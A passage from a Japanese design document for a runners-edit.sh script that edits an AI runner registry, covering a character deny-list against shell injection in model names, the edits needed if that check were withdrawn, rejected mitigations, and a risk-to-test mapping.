（§1.3 / §1.3.1。内部の空白は通る）。

理由: `--setup` は値を `runners.json` へ永続化し、それが 3 層のシンク（S7 の
コマンドライン / bash の runner script 行 / `zsh -ic`）を通って以後の全ディスパッチに
わたって再実行されるため。拒否する文字は実在・将来のモデル名に現れない。

**この検証が効くのは `runners-edit.sh` 経由（S3 の選択肢 2）だけである。** 同じ
`--setup` 実行でも、選択肢 1 / 3 の First-run setup 経路は無検証のまま永続化する
（§1.3.1 の「既知の限界」）。

**この逸脱を採らない判断もありうる**（タスク指示に厳密に従い、無検証で通す）。
その場合に触る箇所は **14 個**ある。「§1.3 の条件と RE4 を落とすだけ」では済まない。

| # | 箇所 | 撤回時の作業 |
|---|---|---|
| 1 | 「前提として守る事実」の model 行 | 拒否条件の記述を削除 |
| 2 | §1.3 の `*_model` 条件 2 | 削除（条件 1 の非空チェックは残す） |
| 3 | §1.3.1 の節ごと | 参照先を失うので削除。**ただし層 1（S7 のコマンドライン）の説明は §2.6 へ移す** |
| 4 | §2.4「自由入力の扱い」の model 行 | 「§1.3 の拒否条件は適用される」を削除。**ただし `'` の拒否だけは §1.3 とは独立した「S7 のクォート要件」として残す**（M1 が `'` を含む runner 名を除外し続けるのと対称。これを落とすと親セッションのシェル注入が開く） |
| 5 | §2.4 の再質問経路の数 | 3 本 → 2 本。コール数上限が最悪 +3 から +2 に戻る |
| 6 | §2.4 の警告文言表 | model "Other" の行を「`'` を含む値」限定に書き換える |
| 7 | §2.4 M1 の `'` 除外（本文） | **除外そのものは変更不要**（§1.3 に依存していない）。ただし「`--name '<runner>'` を単一引用では守れない（§1.3.1 の層 1）」の参照句を「§2.6 の S7 クォート要件」へ差し替える |
| 8 | §2.4 M1 の「§1.3 の deny-list の対象外である」という参照句 | 同じく「§2.6 の S7 クォート要件の対象外」へ差し替える（#7 とは別の文） |
| 9 | §2.6 のクォート規約の相互参照 | 参照先を §1.3.1 から #4 の残置要件へ差し替える |
| 10 | §3 同期表の「S3-M（`*_model` の拒否条件）」行と §3.0.1 (1) の逐語文 2 本 | `'` 限定へ縮小 |
| 11 | SU10 の `[[:cntrl:]]` / `only through option 2` needle、SU15 の `選択肢 2 経由のみ` | 削除または `'` 限定へ |
| 12 | **RE4** | **`'` のみへ縮小してはならない。** 撤回後の正しい期待値は「**空文字 / 空白のみ / 前後に空白を持つ値 → exit 2**（#2 のとおり条件 1 は残る）」「**`'` `"` `` ` `` `$` `\` / ESC → exit 0 かつ完全一致往復**」である。`'` の拒否は §2.4 の LLM 側事前チェックへ移るので、**スクリプト単体テストである RE4 が `'` → exit 2 を assert すると赤くなる** |
| 13 | **RE14a** | **期待値が反転する** — `exit 2` + `cmp` バイト同一ではなく、`exit 0` + `.plan_model` がペイロードとリテラル一致 + `.command` / `.engine` / `.name` 不変 + 他 runner と `default` 不変 に書き換える |
| 14 | 「明示的に採らなかった対策」の該当 2 行、リスク表の「親セッションのシェル注入（§1.3.1 の層 1）」行、リスク表の「deny-list が `"` `\` `$` を弾く限り引用付き補間は悪用不能なので追加テストは要らない」という結論、および本節 | 参照先が消えるので層 1 の説明の移動先（#3 で §2.6 へ移す）を指すよう直すか削除する。**引用付き補間の結論も撤回対象** — 撤回すると `"` が通るので、値の引用付き補間を弁別するテストを 1 件足す必要がある |

**RE14b だけが両分岐で成立する**（`opus[1m]` は拒否文字を含まないので、どちらでも
exit 0 + 往復になる）。RE4 と RE14a は分岐依存なので上表 #12 / #13 のとおり書き換えが要る。

## 明示的に採らなかった対策

| 案 | 不採用の理由 |
|---|---|
| S7 に並行書き込みガード（書き込み直前に 6 フィールドを `--get` で読み直し、S1 表示と違えば中止） | `config.json` は同じ last-write-wins 特性を**文書化しているだけ**（CLAUDE.md 項目 19）。新スクリプトにだけガードを入れると 2 つの edit スクリプトが非対称になり、「ユーザーが求めた書き込みを中止する」という新しい失敗モードが増える。窓は S1 表示後に別ペイン（`--setup` の選択肢 1 / 3、別ペインの S3-M、`--reset runners`、Step 1f の runners reset）がレジストリを書いた場合に開く。**文書化のみ**とする |
| `runners.json` の symlink を `pwd -P` で解決してから書く | `config-edit.sh` は解決しない。片方だけ挙動を変えると非対称になる。**§1.4 に既存挙動として明記するのみ** |
| First-run setup を `runners-edit.sh` 経由に統一 | 非目標。回帰リスクだけが増え、§1.5 の exit 2 と衝突する |
| First-run setup / `--override` の model 自由入力にも §1.3.1 の防御を入れる | 非目標（既存経路の変更）。§1.3.1 に既知の限界として明記する |
| deny-list に `!` を加える（ルート CLAUDE.md 保守手順 27 と同じ 6 文字にする） | 手順 27 は `parallel-directive.sh` の出力位置に対する規約。model の位置では bash 層が非対話で history 展開が起きず、zsh 層は単一引用が `!` を保護するので load-bearing ではない。**意図的に 5 文字にしている**（§1.3.1 に理由を明記） |
| `trap` の回帰テスト（mktemp〜mv の窓で SIGTERM / SIGINT） | シグナルを正確に狙うテストは flaky になりやすい。§1.4 に「テストは無い」と明記して既知の限界とする |

## リスクと対処

| リスク | 対処 |
|---|---|
| S7 の改訂で `single atomic move` が消え SU5 が落ちる | §2.6 の温存表で英日の逐語 3 文を固定。§3.2 で「10 needle のうち 7 個が改訂対象セクション内」と明記。SU16 が S7 温存文を、SU5 が `single atomic move` を守る |
| `## All writes go through …` 節の置換で SU5 の 6 needle が全滅する | §3.1 が「既存本文は残して改題 + 1 段落追記」と明記し、6 needle を逐語列挙 |
| 英日の見出し数がずれて SU8 が落ちる | `### S3-M` を両ファイルへ同時に足し、下位見出しは英日とも `####` で同数・同順。SU8 が H1-H3、SU15 が `####` 数と下限（6 個以上）を検知 |
| `SKILL.md` に日本語が混入する | `pnpm check:doc-lang`。候補プール表のヘッダとセルを英語にしてあるのもこのため |
| 英語ラベルが日本語 doc へ素通りする | §2 で全ユーザー可視文字列の英日対を確定。SU15 が JA needle（ラベル・警告・限定句）を検査する |
| codex に `max` が漏れる | SU12（正アンカー + 負アサーション + claude 行の正コントロール + fail-open 禁止）と RE3 の負・正両方 |
| SU12 のアンカー行が §2.4 と 1 バイトずれて `grep -F` が外れる | §4.2 が「§2.4 と 1 バイト単位で同一。両者は必ず同時に編集する」と明記し、§3 の維持義務にも入れる |
| SU11 の needle が doc のどこにも現れない | §3.1 が `mktemp "$RUNNERS.XXXXXX"` を逐語で書くことを要求し、SU11 の needle をその文字列に揃えた |
| `runners-edit.sh` の jq 式が対象外の runner / フィールドを壊す | RE1 / RE12 / RE14b / RE15 / RE16 |
| 値やフィールド名の補間による `.command` 書き換え / `$ENV` 読み出し | §1.4 の `--arg` 契約（**手順 4 / 5 / 6 / 7a / 8 すべてに適用**）+ RE14b（値の無引用補間）+ RE16 の隣接ケース 3 モード（`--name` の補間）+ RE2 の 3 モード（フィールド名の補間）。**RE14a は deny-list のテストであって `--arg` 契約のテストではない** — 引用付きの素朴な補間 `jq ".plan_model = \"opus[1m]\""` は rc=0 で往復するので、値側を弁別できるのは RE14b だけ。deny-list が `"` `\` `$` を弾く限り引用付き補間は悪用不能なので、追加テストは要らない |
| 親セッションのシェル注入（§1.3.1 の層 1） | §2.4 の "Other" 事前チェック + M1 の `'` 除外。§2.6 に相互参照。撤回分岐でも `'` の拒否だけは残す |
| jq / mktemp の rc がそのまま漏れて 0/1/2 契約が破れる | §1.4 の **9 スニペット**（手順 2 / 3 / 4 / 5 / 6 / 7a / 7b / 8 / 9）+ 手順 4 / 5 / 6 / 7a / 8 の型安全 select + RE8 / **RE15** / RE18 |
| 検証より前に mktemp する実装 | RE9d が read-only 親での exit code で弁別する（trap があるので残骸では見えない） |
| `--dry-run` が mktemp を経由する実装 | RE9e が read-only 親での exit 0 で弁別する |
| `--dry-run` が嘘のプレビューを出す | RE18b の (a) fixture 差 / (b) `--unset` 同載 / (c) 正のコントロール |
| codex `review_model` の unset で次回ディスパッチが `die` | §2.4 の 3 段防御（S1 表示 / 選択肢 description / S6 警告文言）+ SU10 / SU15 の needle **各 4 種**（(a) `unset (not review-capable)` / (b) `no longer be chosen as the reviewer` / (c) `it is the current review_runner` / 規則 3 の `unset it (not review-capable)`。JA も同数） |
| doc 同期漏れ | §3 の表を SoT とする（`--override` クラスタ 5 箇所を含む）。件数の要約は書かない |
| 6 フィールドが 1 コールに収まらない | M2 / M3 の 2 コールに分割済み。各 3 問 × 4 選択肢で上限内 |
| 選択肢が実効同値で埋まる / 未設定へ戻す経路が消える | 規則 2 が現在値と実効既定値を除外し、規則 3 は両者が異なるときだけ最終枠を**規則 2 より優先して**確保する |
